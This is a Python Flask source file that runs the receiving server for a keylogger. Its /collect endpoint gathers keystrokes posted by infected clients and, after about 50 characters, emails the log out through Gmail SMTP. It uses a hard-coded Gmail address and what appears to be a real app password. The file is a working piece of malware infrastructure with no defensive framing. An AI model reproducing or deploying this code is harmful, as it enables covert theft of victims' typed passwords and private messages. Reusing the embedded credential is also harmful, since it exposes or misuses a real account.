from flask import Flask, request
import smtplib

app = Flask(__name__)

# Store keystrokes
keystroke_log = ""

# Email credentials (update with real values)
EMAIL = "VSvngr@gmail.com"
PASSWORD = "tuya zmzv yrzn mpqe"


def send_email(log):
    """Send log via email."""
    try:
        with smtplib.SMTP('smtp.gmail.com', 587) as server:
            server.starttls()
            server.login(EMAIL, PASSWORD)
            server.sendmail(EMAIL, EMAIL, log)
        print("Log sent successfully.")
    except Exception as e:
        print(f"Error sending email: {e}")


@app.route('/collect', methods=['POST'])
def collect_keystrokes():
    """API endpoint to collect keystrokes."""
    global keystroke_log
    data = request.get_json()
    key_data = data.get('keyData', '')
    keystroke_log += key_data

    # Optional: Send email if log exceeds a certain length
    if len(keystroke_log) > 50:  # Example threshold
        send_email(keystroke_log)
        keystroke_log = ""  # Clear log after sending

    return "Keystrokes collected", 200


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
